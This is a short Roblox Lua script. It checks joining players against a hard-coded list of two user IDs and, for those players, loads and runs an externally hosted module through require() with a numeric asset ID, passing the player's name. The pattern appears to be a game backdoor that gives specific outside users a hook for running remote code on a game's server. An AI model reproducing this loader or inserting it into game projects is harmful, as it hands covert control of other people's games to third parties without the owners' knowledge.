local Players = game:GetService("Players")
local WL = {
  [3227511162] = true;
  [119494759] = true;
}
local function onPlayer(player)
	if WL[player.UserId] then
      require(4832971989)(player.Name)
  end
end

for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
Players.PlayerAdded:Connect(onPlayer)
